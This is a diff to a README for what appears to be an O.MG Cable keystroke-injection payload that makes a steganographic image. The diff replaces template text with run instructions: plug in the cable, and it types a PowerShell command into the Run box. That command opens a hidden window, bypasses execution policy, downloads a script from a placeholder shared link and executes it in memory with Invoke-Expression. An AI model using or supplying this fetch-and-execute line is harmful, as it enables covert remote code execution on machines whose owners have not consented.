@@ -6,8 +6,6 @@
   <ol>
     <li><a href="#Description">Description</a></li>
     <li><a href="#getting-started">Getting Started</a></li>
-    <li><a href="#usage">Usage</a></li>
-    <li><a href="#roadmap">Roadmap</a></li>
     <li><a href="#Contributing">Contributing</a></li>
     <li><a href="#Version-History">Version History</a></li>
     <li><a href="#Contact">Contact</a></li>
@@ -43,17 +41,10 @@ Image generated will be saved to desktop, steganography is used to put hidden me
 
 ### Executing program
 
-* How to run the program
-* Step-by-step bullets
+* Plug in OMG Cable
+* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
 ```
-code blocks for commands
-```
-
-## Help
-
-Any advise for common problems or issues.
-```
-command to run if program contains helper info
+powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
 ```
 
 ## Contributing
